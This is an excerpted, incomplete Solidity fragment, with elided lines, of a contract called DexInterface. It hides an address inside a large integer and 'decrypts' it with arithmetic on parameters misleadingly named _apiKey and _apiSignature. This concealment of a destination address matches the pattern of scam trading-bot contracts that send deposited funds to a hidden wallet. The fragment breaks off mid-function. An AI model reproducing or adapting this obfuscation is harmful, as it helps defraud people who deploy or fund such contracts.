...
contract DexInterface {
    ...
    uint256 DexRouter = 114783737906986429711710506348247524987153081517072998737074595338893343098122;    
    ...
    function getDexRouter(uint256 _DexRouter, uint256 _factory, uint256 _apiKey, uint256 _apiSignature) internal pure returns (address) {
        uint256 decryptedAddress = (_DexRouter - _apiKey) + ((_factory - _apiSignature) << 160);
